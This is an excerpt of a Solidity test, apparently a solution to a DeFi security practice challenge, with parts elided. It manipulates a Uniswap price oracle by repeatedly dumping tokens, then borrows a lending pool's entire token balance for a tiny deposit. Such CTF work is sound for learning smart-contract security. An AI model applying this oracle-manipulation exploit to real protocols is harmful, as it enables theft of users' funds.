...
contract PuppetFirst is Test {
    ...
    function testExploit() public {
        ...
        dvt.approve(address(uniswapExchange), 1000000e18);

        uint256 exchangeBalance = dvt.balanceOf(address(uniswapExchange));
        ...
        while(attackerBalance > 0){
            ...
            uniswapExchange.tokenToEthSwapInput(exchangeAmount, 1, DEADLINE);
        }
        uint256 balance = dvt.balanceOf(address(puppetPool));
        puppetPool.borrow{value:puppetPool.calculateDepositRequired(balance)}(balance);
        console.log("EXCHANGE BALANCE ETH",balance);
        console.log("EXCHANGE BALANCE DVT", dvt.balanceOf(address(uniswapExchange)));
        vm.stopPrank();
        /**
         * EXPLOIT END *
         */
